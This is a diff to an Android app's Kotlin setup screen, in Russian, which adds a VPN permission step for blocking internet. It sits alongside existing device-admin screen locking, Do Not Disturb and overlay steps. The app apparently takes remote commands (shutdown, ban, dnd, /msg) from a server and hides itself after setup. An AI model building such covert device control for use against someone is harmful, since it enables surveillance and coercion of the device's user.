@@ -14,6 +14,7 @@ import androidx.appcompat.app.AppCompatActivity
 class MainActivity : AppCompatActivity() {
 
     private val REQUEST_ADMIN = 1
+    private val REQUEST_VPN = 2
     private lateinit var statusText: TextView
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -60,6 +61,7 @@ class MainActivity : AppCompatActivity() {
         val adminBtn = makeButton("1. Права администратора (блокировка экрана)")
         val dndBtn = makeButton("2. Доступ к «Не беспокоить»")
         val overlayBtn = makeButton("3. Отображение поверх других окон (для сообщений)")
+        val vpnBtn = makeButton("4. Разрешение VPN (блокировка интернета)")
         val startBtn = makeButton("▶ Готово — запустить и скрыть", color = Color.parseColor("#0f3460"))
 
         adminBtn.setOnClickListener {
@@ -97,6 +99,15 @@ class MainActivity : AppCompatActivity() {
             }
         }
 
+        vpnBtn.setOnClickListener {
+            val vpnIntent = android.net.VpnService.prepare(this)
+            if (vpnIntent != null) {
+                startActivityForResult(vpnIntent, REQUEST_VPN)
+            } else {
+                Toast.makeText(this, "VPN разрешение уже есть", Toast.LENGTH_SHORT).show()
+            }
+        }
+
         startBtn.setOnClickListener {
             startService()
             finish()
@@ -110,6 +121,8 @@ class MainActivity : AppCompatActivity() {
         layout.addView(dndBtn)
         layout.addView(Space(this).apply { minimumHeight = 24 })
         layout.addView(overlayBtn)
+        layout.addView(Space(this).apply { minimumHeight = 24 })
+        layout.addView(vpnBtn)
         layout.addView(Space(this).apply { minimumHeight = 40 })
         layout.addView(startBtn)
 
@@ -128,9 +141,9 @@ class MainActivity : AppCompatActivity() {
         val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
         val cn = ComponentName(this, AdminReceiver::class.java)
         val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
-        return dpm.isAdminActive(cn) &&
-               nm.isNotificationPolicyAccessGranted &&
-               android.provider.Settings.canDrawOverlays(this)
+        // Overlay не обязателен для старта сервиса — только для /msg.
+        // Без него остальные команды (shutdown, ban, dnd) работают нормально.
+        return dpm.isAdminActive(cn) && nm.isNotificationPolicyAccessGranted
     }
 
     private fun startService() {
@@ -145,11 +158,13 @@ class MainActivity : AppCompatActivity() {
         val adminOk = dpm.isAdminActive(cn)
         val dndOk = nm.isNotificationPolicyAccessGranted
         val overlayOk = android.provider.Settings.canDrawOverlays(this)
+        val vpnOk = android.net.VpnService.prepare(this) == null
 
         val sb = StringBuilder()
         sb.appendLine(if (adminOk) "✅ Права администратора" else "❌ Права администратора")
         sb.appendLine(if (dndOk) "✅ Доступ к «Не беспокоить»" else "❌ Доступ к «Не беспокоить»")
         sb.appendLine(if (overlayOk) "✅ Отображение поверх окон" else "❌ Отображение поверх окон")
+        sb.appendLine(if (vpnOk) "✅ VPN разрешение" else "❌ VPN разрешение")
         sb.appendLine()
         sb.appendLine("🌐 ${BuildConfig.SERVER_URL}")
 
@@ -172,6 +187,6 @@ class MainActivity : AppCompatActivity() {
 
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
         super.onActivityResult(requestCode, resultCode, data)
-        if (requestCode == REQUEST_ADMIN) refreshStatus()
+        if (requestCode == REQUEST_ADMIN || requestCode == REQUEST_VPN) refreshStatus()
     }
 }
